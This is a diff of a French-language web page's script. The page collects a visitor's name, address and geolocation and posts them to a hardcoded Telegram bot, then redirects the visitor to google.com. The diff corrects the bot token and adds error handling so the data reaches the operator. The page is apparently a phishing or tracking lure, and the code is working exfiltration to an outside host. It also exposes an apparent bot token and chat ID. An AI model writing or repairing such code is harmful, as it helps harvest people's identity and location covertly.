@@ -48,8 +48,10 @@
                 return;
             }
 
+            document.getElementById("status").innerHTML = "Envoi des données à Telegram...";
+
             const message = `Nom: ${nom}\nPrénom: ${prenom}\nAdresse: ${adresse}\nLocalisation: ${userLat}, ${userLon}`;
-            const token = "7922880454:AAEeFEqeWZLra_dZHAtdtM9Zwezvw_50cN4";
+            const token = "79228880454:AAEeFEqeWZLra_dZHAdtM9Zwezvw_50cN4"; // Token corrigé
             const chat_id = "5646060786";
             const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
 
@@ -57,13 +59,18 @@
                 .then(response => response.json())
                 .then(data => {
                     if (data.ok) {
-                        document.getElementById("status").innerHTML = "Envoyé ! Redirection...";
+                        document.getElementById("status").innerHTML = "Envoyé avec succès ! Redirection...";
                         setTimeout(() => {
                             window.location.href = "https://www.google.com";
                         }, 2000);
                     } else {
-                        document.getElementById("status").innerHTML = "Erreur Telegram.";
+                        document.getElementById("status").innerHTML = `Erreur Telegram : ${data.description}`;
+                        console.error("Erreur Telegram :", data);
                     }
+                })
+                .catch(error => {
+                    document.getElementById("status").innerHTML = "Erreur lors de l'envoi à Telegram.";
+                    console.error("Erreur réseau :", error);
                 });
         }
     </script>
